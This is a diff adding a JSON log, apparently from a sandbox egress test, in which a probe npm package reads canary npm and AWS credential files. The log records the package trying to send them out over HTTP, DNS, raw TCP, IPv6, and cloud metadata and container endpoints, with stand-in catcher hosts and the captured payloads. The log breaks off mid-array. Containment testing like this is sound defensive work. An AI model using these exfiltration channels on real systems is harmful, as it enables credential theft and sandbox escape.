@@ -1,0 +1,3487 @@
+{
+  "catcher": {
+    "zone": "catch.darkflib.dev",
+    "v4": "95.179.197.125",
+    "v6": "2001:19f0:7400:219f:5400:7ff:fe03:9747"
+  },
+  "control": {
+    "marker": "CONTROL2804AC9483C2",
+    "http_name": "ok",
+    "dns_resolver": "ok",
+    "tcp_v4": "ok",
+    "tcp_v6": "ok",
+    "icmp": "ok"
+  },
+  "runs": [
+    {
+      "seconds": 5.4,
+      "window": [
+        1793926026.584314,
+        1793926032.0298822
+      ],
+      "install_exit": 0,
+      "token_matches_canary": true,
+      "probe_token": "AIRLOCKCANARY254BA764CA8B70C1",
+      "gateway": "172.16.0.5",
+      "outside": {
+        "v4": "78.141.205.99",
+        "v6": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+        "port": 47801,
+        "catcher": {
+          "zone": "catch.darkflib.dev",
+          "v4": "95.179.197.125",
+          "v6": "2001:19f0:7400:219f:5400:7ff:fe03:9747"
+        }
+      },
+      "outside_heard": [],
+      "probe": [
+        {
+          "id": "http-name-443",
+          "what": "HTTPS POST to a name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.18.76.6",
+          "ms": 175
+        },
+        {
+          "id": "http-name-80",
+          "what": "HTTP POST to a name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.18.76.238",
+          "ms": 125
+        },
+        {
+          "id": "http-name-odd-port",
+          "what": "HTTP POST to a name on port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 115
+        },
+        {
+          "id": "dns-resolver",
+          "what": "token in a DNS name, system resolver",
+          "outcome": "resolved",
+          "detail": "198.18.76.253",
+          "addr": "198.18.76.253",
+          "ms": 89
+        },
+        {
+          "id": "dns-gateway-udp",
+          "what": "token in a DNS name, straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 99
+        },
+        {
+          "id": "dns-public-udp",
+          "what": "token in a DNS name, straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 97
+        },
+        {
+          "id": "dns-public-tcp",
+          "what": "token in a DNS name, straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 103
+        },
+        {
+          "id": "dns-public-real-udp",
+          "what": "example.com straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 98
+        },
+        {
+          "id": "dns-public-real-tcp",
+          "what": "example.com straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 102
+        },
+        {
+          "id": "dns-gateway-real",
+          "what": "example.com straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 97
+        },
+        {
+          "id": "raw-ip-https",
+          "what": "HTTPS POST to a public IP (1.1.1.1)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 98 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"1.1.1.1\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "1.1.1.1",
+          "ms": 118
+        },
+        {
+          "id": "raw-ip-http",
+          "what": "HTTP POST to a documentation IP (203.0.113.7)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 102 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"203.0.113.7\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "203.0.113.7",
+          "ms": 105
+        },
+        {
+          "id": "raw-ip-odd-port",
+          "what": "TCP to a public IP on port 4444 (8.8.4.4)",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 96
+        },
+        {
+          "id": "ipv6",
+          "what": "TCP over IPv6 to 2606:4700:4700::1111",
+          "outcome": "connected",
+          "ms": 97
+        },
+        {
+          "id": "ipv6-http",
+          "what": "HTTP GET over IPv6 to Cloudflare (2606:4700:4700::1111)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 107 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2606:4700:4700:\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2606:4700:4700::1111",
+          "ms": 89
+        },
+        {
+          "id": "outside-v4-port",
+          "what": "token over TCP to the lab listener, IPv4",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 81
+        },
+        {
+          "id": "outside-v6-port",
+          "what": "token over TCP to the lab listener, IPv6",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 81
+        },
+        {
+          "id": "outside-v4-http",
+          "what": "HTTP POST to the host's public IPv4, port 80",
+          "outcome": "answered",
+          "detail": "HTTP 403, 104 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"78.141.205.99\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "78.141.205.99",
+          "ms": 89
+        },
+        {
+          "id": "outside-v6-http",
+          "what": "HTTP POST to the host's public IPv6, port 80",
+          "outcome": "answered",
+          "detail": "HTTP 403, 124 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2a05:f480:1000:95d:5400:7ff:fe00\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+          "ms": 89
+        },
+        {
+          "id": "icmp",
+          "what": "ping 1.1.1.1 with token bytes in the payload",
+          "outcome": "error",
+          "detail": "spawn ping ENOENT",
+          "ms": 67
+        },
+        {
+          "id": "icmp-socket",
+          "what": "ICMP echo from an unprivileged ping socket (Python)",
+          "outcome": "error",
+          "detail": "PermissionError: [Errno 13] Permission denied",
+          "ms": 101
+        },
+        {
+          "id": "imds-aws",
+          "what": "metadata service, AWS path (169.254.169.254)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.169.254\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.169.254",
+          "ms": 82
+        },
+        {
+          "id": "imds-vultr",
+          "what": "metadata service, Vultr path (169.254.169.254)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.169.254\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.169.254",
+          "ms": 81
+        },
+        {
+          "id": "imds-gcp-name",
+          "what": "metadata service by name (metadata.google.internal)",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.18.76.87",
+          "ms": 95
+        },
+        {
+          "id": "imds-ecs",
+          "what": "container credentials endpoint (169.254.170.2)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 104 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"169.254.170.2\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "169.254.170.2",
+          "ms": 79
+        },
+        {
+          "id": "imds-alibaba",
+          "what": "metadata service, Alibaba (100.100.100.200)",
+          "outcome": "answered",
+          "detail": "HTTP 403, 106 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"100.100.100.200\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "100.100.100.200",
+          "ms": 79
+        },
+        {
+          "id": "gateway-22",
+          "what": "TCP to the gateway (172.16.0.5) port 22",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 71
+        },
+        {
+          "id": "gateway-53",
+          "what": "TCP to the gateway (172.16.0.5) port 53",
+          "outcome": "connected",
+          "ms": 71
+        },
+        {
+          "id": "gateway-80",
+          "what": "TCP to the gateway (172.16.0.5) port 80",
+          "outcome": "connected",
+          "ms": 72
+        },
+        {
+          "id": "gateway-443",
+          "what": "TCP to the gateway (172.16.0.5) port 443",
+          "outcome": "connected",
+          "ms": 72
+        },
+        {
+          "id": "gateway-1080",
+          "what": "TCP to the gateway (172.16.0.5) port 1080",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 72
+        },
+        {
+          "id": "gateway-2019",
+          "what": "TCP to the gateway (172.16.0.5) port 2019",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 72
+        },
+        {
+          "id": "gateway-8000",
+          "what": "TCP to the gateway (172.16.0.5) port 8000",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 72
+        },
+        {
+          "id": "docker-api",
+          "what": "Docker API on 172.17.0.1:2375",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 72
+        },
+        {
+          "id": "private-10",
+          "what": "private range 10.0.0.1:80",
+          "outcome": "connected",
+          "ms": 72
+        },
+        {
+          "id": "private-192",
+          "what": "private range 192.168.1.1:80",
+          "outcome": "connected",
+          "ms": 72
+        },
+        {
+          "id": "registry-url",
+          "what": "token in a search URL on registry.npmjs.org (allowed)",
+          "outcome": "answered",
+          "detail": "HTTP 200, 58 bytes",
+          "server": "cloudflare",
+          "body": "{\"objects\":[],\"total\":0,\"time\":\"2026-11-06T00:47:09.628Z\"}",
+          "addr": "104.16.7.34",
+          "ms": 766
+        },
+        {
+          "id": "catcher-https-name",
+          "what": "HTTPS POST to the catcher by its real name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.18.76.1",
+          "ms": 137
+        },
+        {
+          "id": "catcher-http-name",
+          "what": "HTTP POST to the catcher by its real name",
+          "outcome": "answered",
+          "detail": "HTTP 200, 11 bytes",
+          "server": null,
+          "body": "{\"ok\":true}",
+          "addr": "198.18.76.65",
+          "ms": 91
+        },
+        {
+          "id": "catcher-name-odd-port",
+          "what": "HTTP POST to the catcher by name, port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 74
+        },
+        {
+          "id": "catcher-v4-http",
+          "what": "HTTP POST to the catcher's IPv4",
+          "outcome": "answered",
+          "detail": "HTTP 403, 105 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"95.179.197.125\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "95.179.197.125",
+          "ms": 67
+        },
+        {
+          "id": "catcher-v4-https",
+          "what": "HTTPS POST to the catcher's IPv4",
+          "outcome": "answered",
+          "detail": "HTTP 403, 105 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"95.179.197.125\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "95.179.197.125",
+          "ms": 76
+        },
+        {
+          "id": "catcher-v4-tcp",
+          "what": "token over raw TCP to the catcher's IPv4, port 4444",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 57
+        },
+        {
+          "id": "catcher-v4-tcp-53",
+          "what": "token over raw TCP to the catcher's IPv4, port 53",
+          "outcome": "connected",
+          "detail": "sent, no reply",
+          "ms": 559
+        },
+        {
+          "id": "catcher-v6-http",
+          "what": "HTTP POST to the catcher's IPv6",
+          "outcome": "answered",
+          "detail": "HTTP 403, 125 bytes",
+          "server": null,
+          "body": "{\"code\":\"network_policy_denied\",\"domain\":\"[2001:19f0:7400:219f:5400:7ff:fe03\",\"message\":\"Request blocked by network policy.\"}",
+          "addr": "2001:19f0:7400:219f:5400:7ff:fe03:9747",
+          "ms": 67
+        },
+        {
+          "id": "catcher-v6-tcp",
+          "what": "token over raw TCP to the catcher's IPv6, port 47801",
+          "outcome": "error",
+          "detail": "ECONNREFUSED",
+          "ms": 58
+        },
+        {
+          "id": "catcher-dns-resolver",
+          "what": "token in a lookup in the catcher's zone, system resolver",
+          "outcome": "resolved",
+          "detail": "198.18.76.242",
+          "addr": "198.18.76.242",
+          "ms": 44
+        },
+        {
+          "id": "catcher-dns-gateway",
+          "what": "token in a lookup in the catcher's zone, straight to the gateway",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 66
+        },
+        {
+          "id": "catcher-dns-8888",
+          "what": "token in a lookup in the catcher's zone, straight to 8.8.8.8 (UDP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 65
+        },
+        {
+          "id": "catcher-dns-1111-tcp",
+          "what": "token in a lookup in the catcher's zone, straight to 1.1.1.1 (TCP)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 65
+        },
+        {
+          "id": "catcher-dns-direct",
+          "what": "token in a lookup sent straight to the catcher (UDP 53)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 65
+        },
+        {
+          "id": "catcher-dns-direct-tcp",
+          "what": "token in a lookup sent straight to the catcher (TCP 53)",
+          "outcome": "answered",
+          "detail": "rcode 3, 0 answers",
+          "ms": 65
+        },
+        {
+          "id": "catcher-icmp",
+          "what": "ping the catcher with token bytes in the payload",
+          "outcome": "error",
+          "detail": "spawn ping ENOENT",
+          "ms": 40
+        }
+      ],
+      "recorded": [
+        {
+          "kind": "canary_exfil",
+          "summary": "POST http://h80.exfil-probe.invalid/x carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.exfil-probe.invalid",
+            "url": "http://h80.exfil-probe.invalid/x",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY254BA764CA8B70C1\n[default]\naws_access_key_id = AKIAA764CA8B70C1\naws_secret_access_key = AIRLOCKCANARY254BA764CA8B70C1/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926030.3500109,
+          "id": 6,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "GET http://metadata.google.internal/computeMetadata/v1/ (0 bytes): answered by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "metadata.google.internal",
+            "url": "http://metadata.google.internal/computeMetadata/v1/",
+            "method": "GET",
+            "bytes": 0,
+            "payload": "",
+            "user_agent": "",
+            "source_kind": "sinkhole"
+          },
+          "ts": 1793926030.3500185,
+          "id": 7,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST http://h80.catch.darkflib.dev/x?t=AIRLOCKCANARY254BA764CA8B70C1 carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.catch.darkflib.dev",
+            "url": "http://h80.catch.darkflib.dev/x?t=AIRLOCKCANARY254BA764CA8B70C1",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY254BA764CA8B70C1\n[default]\naws_access_key_id = AKIAA764CA8B70C1\naws_secret_access_key = AIRLOCKCANARY254BA764CA8B70C1/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926030.3500226,
+          "id": 8,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST https://h443.exfil-probe.invalid/x carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.exfil-probe.invalid",
+            "url": "https://h443.exfil-probe.invalid/x",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY254BA764CA8B70C1\n[default]\naws_access_key_id = AKIAA764CA8B70C1\naws_secret_access_key = AIRLOCKCANARY254BA764CA8B70C1/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926030.3500257,
+          "id": 9,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "POST https://h443.catch.darkflib.dev/x?t=AIRLOCKCANARY254BA764CA8B70C1 carried the canary credentials: captured by Airlock's sinkhole, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.catch.darkflib.dev",
+            "url": "https://h443.catch.darkflib.dev/x?t=AIRLOCKCANARY254BA764CA8B70C1",
+            "method": "POST",
+            "bytes": 175,
+            "payload": "//registry.npmjs.org/:_authToken=npm_AIRLOCKCANARY254BA764CA8B70C1\n[default]\naws_access_key_id = AKIAA764CA8B70C1\naws_secret_access_key = AIRLOCKCANARY254BA764CA8B70C1/canary\n",
+            "user_agent": "",
+            "source_kind": "sinkhole",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926030.3500288,
+          "id": 10,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "DNS lookup of AIRLOCKCANARY254BA764CA8B70C1.dns-gw.invalid carried the canary token: answered NXDOMAIN by Airlock, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "AIRLOCKCANARY254BA764CA8B70C1.dns-gw.invalid",
+            "payload": "AIRLOCKCANARY254BA764CA8B70C1.dns-gw.invalid",
+            "source_kind": "dns",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926030.3500319,
+          "id": 11,
+          "containment": true
+        },
+        {
+          "kind": "dns_blocked",
+          "summary": "DNS lookup of example.com went straight to the gateway, bypassing Airlock's resolver: refused, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "example.com",
+            "payload": "example.com",
+            "source_kind": "dns"
+          },
+          "ts": 1793926030.3500345,
+          "id": 12,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "DNS lookup of AIRLOCKCANARY254BA764CA8B70C1.gw.catch.darkflib.dev carried the canary token: answered NXDOMAIN by Airlock, never left the host",
+          "data": {
+            "stage": "detonate",
+            "host": "AIRLOCKCANARY254BA764CA8B70C1.gw.catch.darkflib.dev",
+            "payload": "AIRLOCKCANARY254BA764CA8B70C1.gw.catch.darkflib.dev",
+            "source_kind": "dns",
+            "proven": true,
+            "this_run": true
+          },
+          "ts": 1793926030.3500373,
+          "id": 13,
+          "containment": true
+        },
+        {
+          "kind": "canary_read",
+          "summary": "probe.js read canary /home/node/.npmrc",
+          "data": {
+            "stage": "detonate",
+            "path": "/home/node/.npmrc",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500397,
+          "id": 14,
+          "containment": true
+        },
+        {
+          "kind": "canary_read",
+          "summary": "probe.js read canary /home/node/.aws/credentials",
+          "data": {
+            "stage": "detonate",
+            "path": "/home/node/.aws/credentials",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500416,
+          "id": 15,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h443.exfil-probe.invalid; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500435,
+          "id": 16,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h80.exfil-probe.invalid; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500464,
+          "id": 17,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach odd.exfil-probe.invalid:4444; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.exfil-probe.invalid:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500493,
+          "id": 18,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to odd.exfil-probe.invalid",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.exfil-probe.invalid",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500514,
+          "id": 19,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 1.1.1.1; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "1.1.1.1",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.350053,
+          "id": 20,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 1.1.1.1",
+          "data": {
+            "stage": "detonate",
+            "host": "1.1.1.1",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.350055,
+          "id": 21,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 203.0.113.7; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "203.0.113.7",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500566,
+          "id": 22,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 203.0.113.7",
+          "data": {
+            "stage": "detonate",
+            "host": "203.0.113.7",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500588,
+          "id": 23,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2606:4700:4700::1111]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2606:4700:4700::1111]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500617,
+          "id": 24,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 78.141.205.99; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "78.141.205.99",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500633,
+          "id": 25,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 78.141.205.99",
+          "data": {
+            "stage": "detonate",
+            "host": "78.141.205.99",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500655,
+          "id": 26,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2a05:f480:1000:95d:5400:7ff:fe00:80d0]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2a05:f480:1000:95d:5400:7ff:fe00:80d0]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500679,
+          "id": 27,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+          "data": {
+            "stage": "detonate",
+            "host": "2a05:f480:1000:95d:5400:7ff:fe00:80d0",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500705,
+          "id": 28,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 169.254.169.254; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "169.254.169.254",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500743,
+          "id": 30,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach metadata.google.internal; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "metadata.google.internal",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500757,
+          "id": 31,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 169.254.170.2; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "169.254.170.2",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.350077,
+          "id": 32,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 100.100.100.200; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "100.100.100.200",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500779,
+          "id": 33,
+          "containment": true
+        },
+        {
+          "kind": "egress_allowed",
+          "summary": "probe.js contacted allowlisted registry.npmjs.org",
+          "data": {
+            "stage": "detonate",
+            "host": "registry.npmjs.org",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500793,
+          "id": 34,
+          "containment": false
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js sent canary credentials to allowlisted registry.npmjs.org in a request URL: it reached that host",
+          "data": {
+            "stage": "detonate",
+            "host": "registry.npmjs.org",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node",
+            "allowlisted": true
+          },
+          "ts": 1793926030.350081,
+          "id": 35,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h443.catch.darkflib.dev; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h443.catch.darkflib.dev",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500826,
+          "id": 36,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach h80.catch.darkflib.dev; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "h80.catch.darkflib.dev",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.350084,
+          "id": 37,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach odd.catch.darkflib.dev:4444; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.catch.darkflib.dev:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500862,
+          "id": 38,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to odd.catch.darkflib.dev:4444 in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "odd.catch.darkflib.dev:4444",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500874,
+          "id": 39,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach 95.179.197.125; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "95.179.197.125",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500893,
+          "id": 40,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 95.179.197.125 in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "95.179.197.125",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500905,
+          "id": 41,
+          "containment": true
+        },
+        {
+          "kind": "egress_blocked",
+          "summary": "probe.js tried to reach [2001:19f0:7400:219f:5400:7ff:fe03:9747]; contained, never reached the internet",
+          "data": {
+            "stage": "detonate",
+            "host": "[2001:19f0:7400:219f:5400:7ff:fe03:9747]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.350092,
+          "id": 42,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to [2001:19f0:7400:219f:5400:7ff:fe03:9747] in a request URL",
+          "data": {
+            "stage": "detonate",
+            "host": "[2001:19f0:7400:219f:5400:7ff:fe03:9747]",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500936,
+          "id": 43,
+          "containment": true
+        },
+        {
+          "kind": "canary_exfil",
+          "summary": "probe.js tried to send canary credentials to 2001:19f0:7400:219f:5400:7ff:fe03:9747",
+          "data": {
+            "stage": "detonate",
+            "host": "2001:19f0:7400:219f:5400:7ff:fe03:9747",
+            "argv": "/tmp/try/node_modules/escape-probe/probe.js",
+            "pid": 559,
+            "source_kind": "node"
+          },
+          "ts": 1793926030.3500953,
+          "id": 44,
+          "containment": true
+        },
